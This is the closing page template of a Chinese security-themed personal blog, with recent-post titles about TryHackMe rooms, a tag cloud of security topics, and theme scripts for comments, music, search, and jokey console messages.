datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>